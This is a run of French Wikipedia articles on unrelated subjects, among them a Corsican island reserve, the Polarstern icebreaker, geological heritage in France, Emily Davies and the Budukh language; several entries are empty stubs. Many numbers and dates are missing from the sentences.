Buck publie bon nombre d'articles sur la culture matérielle des populations autochtones de Nouvelle-Zélande et des îles Cook. Dans les années 1920, il est recruté comme chercheur au Muséum Bishop de Hawai. En 1932, il est nommé professeur visiteur en anthropologie à l'université Yale aux États-Unis. En 1936, il devient directeur du Muséum Bishop. Son ouvrage le plus célèbre, très populaire, est "Vikings of the Sunrise" en 1938, une vulgarisation des sociétés polynésiennes, de leur organisation sociale et de leurs traditions orales, qui plus tard a contribué à la renaissance culturelle polynésienne. En 1946, il est fait chevalier-commandeur de l'ordre de Saint-Michel et Saint-Georges, en reconnaissance de ses travaux.

</doc>
<doc id="2846775" url="https://fr.wikipedia.org/wiki?curid=2846775" title="Réserve naturelle des îles Cerbicale">
Réserve naturelle des îles Cerbicale

La réserve naturelle des îles Cerbicale (RNC51) est une réserve naturelle en Corse. Classée en 1981, elle occupe une surface de et protège un archipel de au large de Porto-Vecchio.
Localisation.
Le territoire de la réserve naturelle comprend 4 îles (l'Île Pietricaggiosa, l'île Piana, l'Île de Maestro Maria ou Île Plate, l'Île Forana) et rocheux plus au large (l'Île du Toro et le rocher de la Vacca). Il est situé dans le département de la Corse-du-Sud, sur la commune de Porto-Vecchio et proche de la côte sud-est, sous la pointe de la Chiappa et de son phare. La superficie terrestre est de , la zone maritime faisant partie de la Réserve naturelle des Bouches de Bonifacio intégrée ultérieurement à la zone du Parc Marin International.
Histoire du site et de la réserve.
Faute d'eau potable, les îles semblent n'avoir jamais été habitées par l'homme.
Écologie (biodiversité, intérêt écopaysager…).
Les îles Cerbicale ont été constituées en réserve naturelle pour préserver la richesse de sa faune aviaire et sous-marine. Elles sont incluses dans le sanctuaire des mammifères marins.
Flore.
Les îles, granitiques, sont couvertes d'un maquis assez dense, pouvant atteindre 2 à de hauteur sur les îles de Piana et Forana et de Silène veloute ("Silene velutina"). L'Île de Maestro Maria présente un terrain sablonneux couvert d'herbacées et de lys des sables (pancratium maritimum).
Faune.
La faune est essentiellement constituée de nombreux oiseaux marins, de lézards et de rats. La zone marine, très importante, contient des herbiers de posidonies et abrite une colonie de Grand Dauphin ("Tursiops truncatus"). Elle est fréquentée par de nombreux oiseaux pélagiques.
La "zone de protection spéciale (ZPS)" s'intéresse plus précisément aux populations de Pétrel tempête (plus grosse population corse), de Cormoran huppé de Méditerranée ("Phalacrocorax aristotelis desmarestii") (environ 10 à 20% des effectifs de France), de Puffin cendré ("Calonectris diomedea"), et de Goéland d'Audouin ("Larus audouinii").
On y rencontre aussi le Faucon pèlerin ("Falco peregrinus"), la Fauvette pitchou ("Sylvia undata"), la Fauvette sarde ("Sylvia sarda") et l'Océanite tempête ("Hydrobates pelagicus").
La population de Martinet pâle ("Apus pallidus") subit la prédation du Rat noir ("Ratus ratus") sur l'île du Toro. Des dératisations ont été effectuées. 
Depuis plusieurs années l'Aigrette garzette ("Egretta garzetta") niche de nouveau sur une des îles (une des seules colonies insulaires maritimes connues pour cette espèce en France).
On y trouve aussi quelques amphibiens et reptiles comme la Cistude d'Europe ("Emys orbicularis"), le Discoglosse Sarde ("Discoglossus sardus"), le Phyllodactyle d'Europe ("Phyllodactylus europaeus"), ainsi que la Tortue d'Hermann ("testudo hermanni") et la Tortue caouanne ("Caretta caretta").
Intérêt touristique et pédagogique.
L'accostage et la pêche, ainsi que la chasse sont interdits sur les îles.
Administration, plan de gestion, règlement.
La gestion de la réserve naturelle est assurée par l'Office de l'environnement de la Corse, qui gère aussi la réserve naturelle des Bouches de Bonifacio. La réserve naturelle fait partie du réseau des Réserves naturelles de Corse.
Le site est enregistré dans le cadre du réseau Natura 2000 sous le code FR9410022. Elle a obtenu le statut de ZPS.
Dans le cadre du réseau des Aires Marines protégées de France, elle s'associe au projet de création du Parc Marin International des espaces protégés de Corse et de Sardaigne de part et d’autre du détroit des Bouches de Bonifacio.
Outils et statut juridique.
La réserve naturelle a été créée par le décret -205 du .
Elle a rejoint la gestion commune à la création de la Réserve naturelle des Bouches de Bonifacio depuis le Décret du . Ce décret indique que le domaine terrestre des Îles Cerbicales n'est pas visé par le classement de la RN des Bouches de Bonifacio bien que le périmètre de celle-ci englobe l'archipel. Par ailleurs, la réserve naturelle fera partie du futur Parc Marin International corso-sarde.

</doc>
<doc id="2846781" url="https://fr.wikipedia.org/wiki?curid=2846781" title="Philo Judaeus">
Philo Judaeus



</doc>
<doc id="2846786" url="https://fr.wikipedia.org/wiki?curid=2846786" title="Abou Hanifah">
Abou Hanifah



</doc>
<doc id="2846788" url="https://fr.wikipedia.org/wiki?curid=2846788" title="Belawan">
Belawan

Belawan est une ville portuaire sur la côte du nord est de Sumatra, en Indonésie. Située sur la rivière Deli, près de la ville de Medan, Belawan est le port le plus actif d'Indonésie après ceux de Java.
Un service régulier de ferry relie Belawan à Penang, en Malaisie. Il y a également des ferry jusqu'à Satun, en Thaïlande.
Le port a été construit en 1890, pour transporter le tabac. 
Le port s'est étendu en 1907, pour le commerce avec la Chine. 
Dans les années 1920, l'activité du port s'est développée, en même temps que les plantations de caoutchouc et de palmier à huile dans le nord de Sumatra.
En 1938, le port était le plus grand des Indes néerlandaises.
Le volume d'activité s'est considérablement réduit à l'indépendance de l'Indonésie, et n'a retrouvé son niveau que dans les années 1960.
Restructuré en 1985 avec la construction d'un terminal à conteneur, il a immédiatement capté 20 % des exportations en conteneur indonésiennes. Les principales exportations concernent le caoutchouc, l'huile de palme, le thé et le café.

</doc>
<doc id="2846792" url="https://fr.wikipedia.org/wiki?curid=2846792" title="Pole lardy">
Pole lardy



</doc>
<doc id="2846793" url="https://fr.wikipedia.org/wiki?curid=2846793" title="Manœuvre d'Adson">
Manœuvre d'Adson

La manœuvre d'Adson est un test clinique permettant la détection d'une compression vasculaire dans le cadre du syndrome du défilé thoracique ("thoracic outlet syndrome" ou TOS) ou du syndrome de la côte cervicale. Il s'agit le plus souvent d'une compression de l'artère sous-clavière entre la première côte et la clavicule ou entre les muscles scalènes antérieur et moyen.
Le test consiste en une rotation de la tête du côté examiné, le menton relevé, bras examiné en rotation externe et abduction, accompagné d'une inspiration profonde. Le test est positif si le pouls radial disparaît du côté atteint.

</doc>
<doc id="2846794" url="https://fr.wikipedia.org/wiki?curid=2846794" title="Saint-Livier">
Saint-Livier



</doc>
<doc id="2846795" url="https://fr.wikipedia.org/wiki?curid=2846795" title="Ayrton Senna's Super Monaco GP 2">
Ayrton Senna's Super Monaco GP 2



</doc>
<doc id="2846796" url="https://fr.wikipedia.org/wiki?curid=2846796" title="FS Polarstern">
FS Polarstern

Le FS ("Forschungsschiff)" Polarstern : "navire de recherche Étoile polaire", en allemand, est un navire océanographique et brise-glace allemand de l'Institut Alfred Wegener pour la recherche polaire et marine de Bremerhaven. Le "Polarstern" fut commissionné en 1982, et est principalement utilisé pour des recherches en Arctique et Antarctique.
D'une longueur de , il a été construit à Kiel et Rendsburg.
Le "Polarstern" possède une double coque. Il peut être opérationnel jusqu'à une température extérieure de et peut briser une banquise de d'épaisseur à une vitesse de . De la glace plus épaisse doit être cassée par "ramming" (technique du bélier).
Un successeur sera construit à Wismar d'ici 2030 par ThyssenKrupp Marine Systems.

</doc>
<doc id="2846802" url="https://fr.wikipedia.org/wiki?curid=2846802" title="Patrimoine géologique">
Patrimoine géologique

Le patrimoine géologique (parfois aussi dénommé "« géopatrimoine »") est un sous-ensemble du patrimoine naturel. Il . Il comprend notamment l'ensemble des sites naturels d'intérêts géologiques, mais également les collections et autres objets et « curiosités géologiques ». Le terme géologie est à prendre dans son acception la plus large (du grec "geo-logos" : parler de la Terre), regroupant l'ensemble de la géodiversité. Il inclut donc la sédimentologie, la paléontologie, la minéralogie, la tectonique, la géomorphologie etc. Son caractère patrimonial, scientifique, pédagogique, historique ou autre, peut justifier de son recensement dans le cadre d'un inventaire du patrimoine naturel et dans certains cas, de sa protection et de sa valorisation en raison de son intérêt pédagogique et de la demande géotouristique.
Valorisation.
Le patrimoine géologique et géomorphologique est de plus en plus reconnu par les institutions qui cherchent à le mettre en valeur : valorisation in situ (aménagement de sentiers d'interprétation, de belvédères et de placettes d'observation, pose de panneaux pédagogiques, sorties scolaires encadrées, visites guidées) et ex situ (espaces muséographiques dédiés aux sites géologiques, publication de brochures pédagogiques et de livres, création de site web à vocation pédagogique). La réalisation de produits géodidactiques peuvent ainsi inciter les géotouristes à vouloir découvrir et mieux connaître la géodiversité d’un territoire.
Dans le monde.
C’est au que sont apparues en Europe, aux États-Unis, au Canada, en Australie et en Nouvelle-Zélande, les premières préoccupations en matière de conservation des objets géologiques, par exemple en Suisse avec la mise sous protection du bloc erratique de Pierrabot en 1838 par la ville de Neuchâtel et celle des blocs erratiques dans les forêts et domaines de l'État en 1895.
La notion de patrimoine géologique a émergé au niveau mondial au début des années 1990 au cours d'un congrès international sur la protection du patrimoine géologique à Dignes-les-Bains (Alpes-de-Haute-Provence) qui vote la « déclaration internationale des droits de la mémoire de la Terre ». Ce symposium réunit sous l’égide de l’UNESCO plus de 150 géologues venus de plus de 30 pays différents.
En 2021, l'Académie américaine des sciences a publié un ouvrage intitulé "America's Geoheritage II" portant sur l'identification, le développement et la préservation du géohéritage.
En France.
Au début du , le patrimoine architectural et culturel est reconnu à travers les monuments historiques mais il n'est pas vraiment question de nature. La notion de patrimoine naturel apparaît en France dans la loi du vouée à la protection des « sites et monuments naturels de caractère artistique ». Elle concerne les ensembles naturels (cascades, grottes, rochers, etc.) qui ont été désignés comme pittoresques par la peinture, les guides touristiques et la photographie. La loi du 2 mai 1930 relative « aux monuments naturels et aux sites de caractère artistique, historique, scientifique, légendaire ou pittoresque » remplace celle de 1906 en enrichissant la liste des caractères justifiant la protection d'un site mais seuls quelques sites d’intérêt paléontologique sont protégés. Par la loi du , le législateur ouvre la notion de patrimoine naturel à la géologie. Bien qu'essentiellement faite pour la protection du monde vivant, cette loi permet aussi celle des « gisements minéraux et de fossiles » et des « formations géologiques, géomorphologiques ou spéléologiques remarquables ». L'État reconnait ainsi le patrimoine géologique, au même titre que le patrimoine faunistique et floristique.
En 1980 une première réserve naturelle à caractère géologique est créé (réserve naturelle régionale de Montredon) suivie en 1982 de la Réserve naturelle nationale géologique de Saucats et la Brède (Gironde) et de la réserve naturelle nationale François Le Bail (île de Groix). Ensuite, de 1982 à 1994 neuf réserves naturelles nationales géologiques sont créées. Au même moment douze réserves naturelles volontaires à vocation géologique voient le jour. Ce cadre juridique s'est vite montré insuffisant pour protéger les minéraux, fossiles et concrétions. À la suite de diverses démarches, le Ministère de l'environnement créé en 1981 les "Commissions Bouchardeau" pour réfléchir à la protection du patrimoine géologique en France mais aucune suite n'est donné à ce travail. 
En 1984 une note de synthèse conclut que ce patrimoine , sans suites. En 1986, la conférence permanente des réserves naturelles (créée 4 ans plus tôt, le et renommée Réserves naturelles de France en 1994) forme en son sein une commission du patrimoine géologique (qui deviendra l'interlocuteur principal du ministère de l'environnement. Elle contribue à la tenue d'un symposium international à Digne en 1991 (alors qu'une étude juridique sur la protection du patrimoine géologique se fait de 1989 à 1992. Ce n'est qu'en 1995 que la Loi Barnier prend à nouveau en compte la protection des sites paléontologiques et minéralogiques mais ses décrets d'application n'ont jamais été publiés. 
En , de premières « Journées Nationales du patrimoine géologique » sont organisées au ministère de l'environnement à l'initiative de l'Association des Géologues du Bassin de Paris (AGBP). Des présentations et discussions y permettent notamment d’intégrer au patrimoine géologique les collections privées et publiques, les écrits anciens, les publications de référence et les sites anthropisés. Le patrimoine géologique n’est plus limité à sa composante "". Afin de cerner l'intérêt des objets et des sites à protéger, est lancé officiellement l’Inventaire National du Patrimoine Géologique en 2007 sous la responsabilité scientifique du Muséum national d'histoire naturelle.
L'inventaire national du patrimoine géologique.
L’inventaire national du patrimoine géologique a été lancé en 2007 dans le cadre de la loi du , relative à la démocratie de proximité. Celle-ci précise en ces termes que « l'État […] assure la conception, l'animation et l'évaluation de l'inventaire du patrimoine naturel qui comprend les richesses écologiques, faunistiques, floristiques, géologiques, minéralogiques et paléontologiques ». Une méthodologie spécifique a été définie pour cet inventaire.
L’État, à travers le Ministère chargé de l’environnement et ses délégations régionales (DREAL), est maitre d’œuvre de cet ouvrage.
Afin de réaliser un inventaire cohérent et homogène sur tout le territoire, l’élaboration d’une méthodologie commune a été nécessaire. L'ensemble des étapes a été discuté, expérimenté et validé par la Conférence Permanente du Patrimoine Géologique (CPPG), instance de réflexion créée par le Ministère et qui comprend : le Muséum national d'histoire naturelle, le BRGM, la Société géologique de France, les Musées de France, les Réserves Naturelles de France, la Fédération Française Amateur de Minéralogie et de Paléontologie et deux experts.
L’inventaire est réalisé en région. Une fois validé par le CSRPN de la région, il doit être validé nationalement par le Muséum national d'histoire naturelle (qui est le référent scientifique de l’inventaire pour le ministère chargé de l’environnement). Une fois validé au niveau national, l’inventaire a pour vocation d’être diffusé et mis en ligne pour tous, dans le cadre du « porté à connaissance ».
Le lancement de cet inventaire du patrimoine géologique a été critiqué par certaines associations et fédérations d'associations.
Il voit un premier aboutissement à travers différents colloques régionaux, nationaux ou internationaux à Digne-les-Bains (2008, 2012), Caen (2013), Toulouse (2015), Chambéry (2018).
Communication, sensibilisation, médiation.
Un des objectifs de l'inventaire est d'offrir au public la possibilité de mieux connaitre ce patrimoine, de montrer son intérêt scientifique, historique, parfois esthétique. De nombreux acteurs (collectivités territoriales, musées, maisons de pays, maisons de patrimoine, maisons du littoral, associations, particuliers) recourent à deux formes principales de médiation : médiation passive qui s'exerce par le biais d'équipements fixes dans des structures à vocation muséale, sur les sites eux-mêmes en ville ou en campagne (sentier d'interprétation, panneaux, pupitres, bornes…) ou au moyen d'éléments mobiles (dépliants, livrets tels que la collection « Balades géologiques », applications dédiées pour smartphones, tablettes connectées, etc, explorations virtuelles) ; méditation active qui implique un média humain (visites commentées dans les structures muséales, lors de parcours de sentiers, lors de sorties géologiques, in situ…).
Grâce à un géopatrimoine très varié, les pays peuvent accueillir plusieurs formes de "géotourisme".

</doc>
<doc id="2846807" url="https://fr.wikipedia.org/wiki?curid=2846807" title="Méthode des moments">
Méthode des moments

La méthode des moments, selon le contexte, peut se référer à :

</doc>
<doc id="2846809" url="https://fr.wikipedia.org/wiki?curid=2846809" title="Dimanche de la Croix">
Dimanche de la Croix

Le Dimanche de la Croix est une célébration de l'Église orthodoxe, partie de la liturgie pascale ayant lieu quatre semaines avant le dimanche de Pâques (P - 28). C'est le troisième dimanche du Grand Carême. Il suit le dimanche des Reliques (P - 35) et précède le dimanche de Jean Climaque (P - 21). Durant ce dimanche, le service divin comprend un rituel spécifique de vénération de la Croix qui prépare les fidèles à la commémoration de la Crucifixion durant la Semaine Sainte et de sa Résurrection.
Thème.
Ce dimanche marque la mi-carême. C'est un encouragement dans cet effort. Le carême est un combat, mais .
Ce jour est à comprendre en rapport avec la destination finale du Carême : Pâques, c'est-à-dire la Résurrection, dont sont d'ailleurs tirés les thèmes musicaux du canon. 
Il en est comme de la venue du Roi : son drapeau et ses emblèmes le précèdent, puis il vient lui-même. De même, notre Seigneur Jésus-Christ qui doit bientôt nous manifester la victoire sur la mort et venir avec gloire, au jour de la Résurrection, nous a-t-il envoyé en avance son sceptre, l'emblème royal, la Croix vivifiante, qui nous a remplis, autant que cela nous est possible, de joie et de rafraîchissement, et nous rend prêts à célébrer hautement son triomphe.
Pratique.
Lors de ce dimanche, la Croix est installée au milieu de l’église, non seulement afin d’évoquer pour les fidèles la Rédemption données aux Hommes par le Christ, pour les encourager dans l’effort du Carême, mais aussi pour leur rappeler les paroles du Christ : . L’Église enseigne que c’est par la Croix du Christ qu'est sauvés le croyant. En s’attachant à cet arbre de la vie qu’est la Croix du Seigneur, le fidèle ne mourra plus, mais vivra dans l’éternité.
La Croix est plantée au milieu de l’Église également pour reconforter et encourager ceux qui participent au Grand Carême. Pour l’Église, l’apparition de la Croix au milieu des fidèles rappelle les bannières et symboles qui précèdent le retour d’un roi triomphant. La lecture de l’Épître aux Hébreux, , explique la prêtrise du Christ et la lecture de l’Évangile ; un fragment de Marc, , finit par les mots : .
Lectures du Dimanche de la Croix.
Épître de Paul aux Hébreux.
Ayant donc un grand prêtre souverain qui a traversé les cieux, Jésus, le Fils de Dieu, tenons ferme la profession de foi. Car nous n’avons pas un grand prêtre impuissant à compatir à nos faiblesses, lui qui a été éprouvé en tout, d’une manière semblable, à l’exception du péché. Avançons-nous donc avec assurance vers le trône de la grâce afin d’obtenir miséricorde et de trouver grâce, pour une aide opportune. Tout grand prêtre, en effet, pris d’entre les hommes, est établi pour intervenir en faveur des hommes dans leurs relations avec Dieu, afin d’offrir dons et sacrifices pour les péchés. Il peut ressentir de la commisération pour les ignorants et les égarés, puisqu’il est lui-même également enveloppé de faiblesse, et qu’à cause d’elle, il doit offrir pour lui-même des sacrifices pour le péché, comme il le fait pour le peuple. Nul ne s’arroge à soi-même cet honneur, on y est appelé par Dieu, absolument comme Aaron. De même ce n’est pas le Christ qui s’est attribué à soi-même la gloire de devenir grand prêtre, mais il l’a reçue de celui qui lui a dit : Tu es mon fils, moi, aujourd’hui, je t’ai engendré ; comme il dit encore ailleurs : Tu es prêtre pour l’éternité, selon l’ordre de Melchisédech.
Évangile de Marc.
Appelant à lui la foule en même temps que ses disciples, il leur dit : “Si quelqu’un veut venir à ma suite, qu’il se renie lui-même, qu’il se charge de sa croix, et qu’il me suive. Qui veut en effet sauver sa vie la perdra, mais qui perdra sa vie à cause de moi et de l’Évangile la sauvera. Que sert donc à l’homme de gagner le monde entier, s’il ruine sa propre vie ? Et que peut donner l’homme en échange de sa propre vie ? Car celui qui aura rougi de moi et de mes paroles dans cette génération adultère et pécheresse, le Fils de l’homme aussi rougira de lui, quand il viendra dans la gloire de son Père avec les saints anges.” Et il leur disait “En vérité je vous le dis, il en est d’ici présents qui ne goûteront pas la mort avant d’avoir vu le Royaume de Dieu venu avec puissance.”.
Autres lectures.
Voir Lectures du jour suivies d'une homélie
Hymnographie.
Comme pour la fête de l’Élévation de la Croix du , le Trisagion est remplacé par l’hymne :
&lt;poem&gt;
&lt;/poem&gt;
&lt;poem&gt;
&lt;/poem&gt;

</doc>
<doc id="2846813" url="https://fr.wikipedia.org/wiki?curid=2846813" title="Méthode des moments (analyse numérique)">
Méthode des moments (analyse numérique)

En analyse numérique, la méthode des moments est une méthode de résolution numérique de problèmes linéaires avec conditions aux limites. La méthode consiste à ramener le problème à un système linéaire.
Description de la méthode.
La méthode des moments permet de résoudre les équations inhomogènes du type :
où est un opérateur linéaire, et deux fonctions. Généralement, on nomme la fonction le terme "excitation" ou "source", et le terme de "champ" ou la "réponse", l'inconnu que l'on cherche à déterminer.
La fonction peut être décomposée sur une base de fonctions formula_2:
où les coefficients formula_4 sont constants. L'opérateur étant linéaire, on a :
On définit également un produit scalaire dans l'espace des fonctions (généralement un espace de Hilbert) ainsi que des "fonctions tests" dans le domaine de l'opérateur . En prenant le produit scalaire de l'équation précédente avec chaque , on obtient :
Cette série d'équations peut se récrire sous forme matricielle :
où
Si la matrice est inversible, alors les coefficients formula_10 peuvent être calculés par :
La méthode des moments consiste à choisir l'ensemble de fonctions-test 
Cas particulier : méthode de Galerkine.
Lorsque les fonctions tests sont choisies telles que , cette méthode est connue sous le nom de méthode de Galerkine, du nom du mathématicien russe Boris Galerkine.

</doc>
<doc id="2846814" url="https://fr.wikipedia.org/wiki?curid=2846814" title="Emily Davies">
Emily Davies

Sarah Emily Davies (Southampton, - Hampstead ) est une féministe anglaise. Elle œuvre aux côtés des suffragistes pour l'obtention du droit de vote pour les femmes et est l'une des premières femmes à militer pour l'entrée des femmes dans les universités. Elle est principale de Girton College de 1870 à 1872.
Éléments biographiques.
Née en 1830 à Southampton, fille de John Davies, pasteur anglican évangélique et de Mary Hopkinson, elle passe la majeure partie de son enfance à Gateshead. Alors que ses trois frères reçoivent une éducation académique dans un internat, Davies est éduquée chez ses parents, et c'est la réussite de son frère John Llewelyn à l'université de Cambridge qui lui fait prendre conscience de l'inégalité des chances pour les femmes vis-à-vis de l'éducation.
Militantisme.
À la mort de son père en 1862, Davies s'installe à Londres où elle publie une revue féministe, "The Englishwoman's Journal", et participe à la création de la Kensington Society en 1865 avec dix autres militantes dont notamment Elizabeth Garrett Anderson, dont elle rencontre également plus tard la sœur cadette, Millicent Fawcett, qui s'implique à son tour dans la lutte pour l'obtention du droit de vote des femmes, ou encore Emelia Russell Gurney. La Kensington Society est l'une des principales organisations à lutter pour l'obtention du droit de vote pour les femmes et Davies s'y investit fortement lors de la présentation de la première pétition faite au Parlement en 1866, à l'initiative de John Stuart Mill et du London Suffrage Commitee. Elle publie la même année "The Higher Education of Women".
Davies s'implique fortement dans la lutte pour l'égalité hommes/femmes dans l'enseignement supérieur. Elle s'investit notamment dans des institutions telles que le London School Board, l'institution chargée de gérer le système éducatif londonien qui a déjà établi en son sein la parité hommes/femmes dans les scrutins, ou la Schools Inquiry Commission, chargée quant à elle de la gestion des fonds publics alloués à l'éducation. C'est grâce à son engagement dans ces institutions qu'elle obtient l'admission des filles aux examens officiels des écoles secondaires. À la suite de cette victoire, elle poursuit sa lutte pour l'obtention du droit des femmes à accéder aux études supérieures dans les universités de Oxford et Cambridge.
En 1869, Davies mène la fondation du premier collège exclusivement féminin du Royaume-Uni, le Girton College de Hitchin dans le Hertfordshire. En 1873, ce collège est installé à Cambridge et Davies y enseigne pendant deux ans avant d'en devenir la directrice jusqu'en 1904. Mais le Girton College n'est pas intégré à l'université de Cambridge et doit délivrer ses propres diplômes jusqu'en 1940.
Dès 1889, elle recommence à s'investir dans la lutte pour le droit de vote des femmes auprès de la London National Society for Women's Suffrage et la National Union of Women's Suffrage Societies (NUWSS). Son idéal de militante féministe s'oppose aux actions violentes menées par les Pankhurst et les suffragettes dans la lutte pour le droit de vote. En 1910, elle publie "Thoughts on Some Questions Relating to Women". À la suite de son désaccord sur l'affiliation de la NUWSS au parti travailliste en 1912, elle quitta l'association pour la .

</doc>
<doc id="2846816" url="https://fr.wikipedia.org/wiki?curid=2846816" title="Le Parfait alibi">
Le Parfait alibi



</doc>
<doc id="2846821" url="https://fr.wikipedia.org/wiki?curid=2846821" title="Monkeypox">
Monkeypox



</doc>
<doc id="2846822" url="https://fr.wikipedia.org/wiki?curid=2846822" title="Hundreds and thousands">
Hundreds and thousands



</doc>
<doc id="2846824" url="https://fr.wikipedia.org/wiki?curid=2846824" title="Orthopoxvirus simien">
Orthopoxvirus simien



</doc>
<doc id="2846825" url="https://fr.wikipedia.org/wiki?curid=2846825" title="Bloodflowerz">
Bloodflowerz

Bloodflowerz, aussi stylisé Bl[A]dflowerz, est un groupe allemand de metal gothique et alternatif. Formé en 2002, le groupe s'éteint en 2007, en décembre, après un dernier concert, pour raisons personnelles. Il se reforme en 2013.
Biographie.
Bloodflowerz joue en soutien à Anathema, en Allemagne en décembre 2001. Avec la sortie du single ', le groupe tourne à nouveau cette fois avec Subway to Sally. Ils font une ensuite une tournée en soutien à leur premier album homonyme, ', publié en avril 2002. En 2003, ils entrent en studio d'enregistrement Woodhouse Studio de Hagen avec les producteurs Siggi Bemm et Dan Diamond pour ", un album-concept sur les sept pêchés capitaux, annoncé le 26 mai 2003 au label Silverdust Records.
En mars 2005, le groupe semblait s'être séparé, jusqu'au recrutement du guitariste Jochen Laser, ancien membre du groupe Blue Jason, et du bassiste Jan Beckmann, en novembre. En décembre la même année, le groupe annonce son entrée au studio d'enregistrement Mastersound Studio à Fellbach, en janvier 2006, pour leur nouvel album, intitulé ". Le groupe se sépare en décembre 2007, après un dernier concert, pour raisons personnelles. Il se reforme en 2013.

</doc>
<doc id="2846826" url="https://fr.wikipedia.org/wiki?curid=2846826" title="Shekhinah">
Shekhinah



</doc>
<doc id="2846830" url="https://fr.wikipedia.org/wiki?curid=2846830" title="John McCabe (compositeur)">
John McCabe (compositeur)

John McCabe (né à Huyton, Merseyside, le , et mort le à Rochester, Kent) est un compositeur et pianiste britannique.
Biographie.
Compositeur très prolifique depuis son plus jeune âge, à 11 ans il avait déjà écrit treize symphonies. Après des études à Manchester et à Munich, il a entrepris une carrière de compositeur et de pianiste virtuose. Il a composé dans presque tous les genres, avec cinq symphonies, quinze œuvres concertantes et huit ballets. Comme de nombreux compositeurs de sa génération, McCabe a fait des expériences avec le sérialisme, pour se tourner ensuite vers le post-tonalisme.
Il s'est fait connaître tout d'abord comme pianiste, ayant dans son répertoire des œuvres de Bax, Corigliano, Haydn, Hindemith, Rawsthorne et Webern.
Comme compositeur, il s'est fait connaître avec le cycle vocal "Notturni ed Alba" (1970). Il a ensuite écrit cinq symphonies (1965-2000), plusieurs ballets, des quatuors à cordes, de la musique instrumentale (surtout pour le piano). Aujourd'hui il est connu notamment pour ses concertos : quatre pour le piano (1966-76), trois pour un ou deux violons (1959, 1980, 2003), et d'autres pour alto (1962), clavecin (1968), hautbois d'amour (1972), clarinette (1977), orchestre (1982), trompette (1987) et flûte (1990), ainsi qu'un double concerto pour alto et violoncelle (1965) et un pour clarinette et hautbois (1988).
John McCabe a été nommé Commandeur de l'Empire britannique en 1983 pour services rendus à la musique.

</doc>
<doc id="2846831" url="https://fr.wikipedia.org/wiki?curid=2846831" title="Mixed Up">
Mixed Up

 est une compilation de remixes du groupe rock britannique The Cure sortie le .
Un bon nombre des remixes étaient déjà sortis sur des maxis 45 tours (tous les "Extended Mix", y compris le "Extended Dub Mix" de "Pictures of You" connu précédemment comme "Strange Mix" ). Les autres ont été réalisés pour cet album "Mixed Up". Les titres "The Walk" et "A Forest" sont même réenregistrés avant d'être remixés, les bandes avec les enregistrements originaux ayant été perdues.
Un nouveau titre clôt le disque, "Never Enough", présenté ici dans sa version longue ("Big Mix"). Il était déjà sorti en single en septembre 1990.
Le , à l'occasion du Record Store Day, "Mixed Up" ressort en version remastérisée au format double vinyle.
Le une édition Deluxe est publiée sous la forme d'un triple CD intégrant l'album de remixes "Torn Down" sorti lui aussi en vinyle le 
Liste des titres.
Édition Deluxe 2018.
CD 1
Liste identique à l'édition originale
CD 2 : Remixes 1982-1990 : Mixed Up Extras 2018
CD 3 : Torn Down : Mixed Up Extras 2018 

</doc>
<doc id="2846832" url="https://fr.wikipedia.org/wiki?curid=2846832" title="Avant l'aurore (court métrage)">
Avant l'aurore (court métrage)

Avant l'aurore ("Before Dawn") est un court métrage hongrois réalisé par Bálint Kenyeres, sorti en 2005. Il fut nommé au Festival de Cannes 2005 pour la Palme d'or du meilleur court-métrage. "
Synopsis.
Avant la naissance de l'aube, le blé ondule silencieusement sous les collines. Un camion entre en scène, un "camion hors-la-loi" qui ne tardera pas à se faire rattraper au milieu de ce calme paysage de campagne… Avant la naissance de l'aube, rien ne bouge, tout est calme. Qui y survivra ?

</doc>
<doc id="2846836" url="https://fr.wikipedia.org/wiki?curid=2846836" title="Province de Limpopo">
Province de Limpopo



</doc>
<doc id="2846839" url="https://fr.wikipedia.org/wiki?curid=2846839" title="Démographie d'Afrique du Sud">
Démographie d'Afrique du Sud



</doc>
<doc id="2846840" url="https://fr.wikipedia.org/wiki?curid=2846840" title="Slide, Donald, Slide">
Slide, Donald, Slide

Slide, Donald, Slide est un court métrage d'animation américain de la série "Donald Duck" réalisé par Jack Hannah pour les studios Disney et sorti en 1949.
Synopsis.
Donald veut écouter sur sa radio le match de baseball, mais une abeille - qui n'a pas les mêmes goûts que lui - préfère, elle, écouter de la musique classique...

</doc>
<doc id="2846843" url="https://fr.wikipedia.org/wiki?curid=2846843" title="Budukh">
Budukh

Le budukh (ou budugh ; autonyme, Будад мез, "budad mez") est une langue caucasienne, du groupe des langues nakho-daghestaniennes, appartenant à la branche lezgique dont il forme un rameau séparé avec le kryz. Il est parlé par environ personnes, dans la région de Quba (nord de l'Azerbaïdjan). La dénomination de la langue est celle de la principale localité, Budukh, située dans une zone isolée du Caucase, à d'altitude.
Cette langue se parle sous deux formes : le budukh et le yergüc.
Situation linguistique.
Le budukh est menacé d'extinction, du fait d'une forte pression de la langue azéri.
Écriture.
Le budukh est écrit avec l’alphabet cyrillique.
Dans les années 2010, un alphabet latin a été développé pour l’écriture du budukh.
Dans la version de 2017 de l’alphabet latin budukh, les lettres ħ, ts', xh, ˁ sont utilisées ; elles sont remplacées par les lettres hˊ, hˊˊ, sˊ, xˊ dans l’alphabet de 2025. Par exemple dans ' et ' « beurre », ' et ' « sauterelle », ' et ' « eau », ' et ' « œil ».
Morphologie.
Classes nominales.
Comme de nombreuses langues nakho-daghestaniennes, le budukh organise le nom selon des classes nominales.

</doc>
<doc id="2846848" url="https://fr.wikipedia.org/wiki?curid=2846848" title="Budugh">
Budugh



</doc>
<doc id="2846851" url="https://fr.wikipedia.org/wiki?curid=2846851" title="Mother McCree's Uptown Jug Champions">
Mother McCree's Uptown Jug Champions

Mother McCree's Uptown Jug Champions était un groupe de musique folk précurseur de Grateful Dead car il a été la première collaboration musicale entre Jerry Garcia, Bob Weir et Ron Pigpen McKernan, membres fondateurs des Grateful Dead.
Les autres membres du groupe étaient Tom Stone, Dave Parker et Michael Garbett.
Le groupe n'a produit qu'un album. Il s'agit d'un album du concert au "Top of the Tangent" à Palo Alto en Californie en . Le disque est sorti en 1999.

</doc>
<doc id="2846852" url="https://fr.wikipedia.org/wiki?curid=2846852" title="Siège de Valenciennes (1656)">
Siège de Valenciennes (1656)

Le siège de Valenciennes est une victoire remportée le par l'armée espagnole de Don Juan d'Autriche sur l'armée française du maréchal de Turenne près de Valenciennes.
Ce fut l'une des dernières grandes victoires espagnoles du , et une des rares défaites de Turenne au cours de sa carrière.
Déroulement.
Le , l'armée française, commandée par Turenne, commença le siège de la ville stratégique de Valenciennes, défendue par une garnison espagnole sous le commandement de Francisco de Meneses.
Le siège, bien organisé, affaiblit peu à peu les défenseurs.
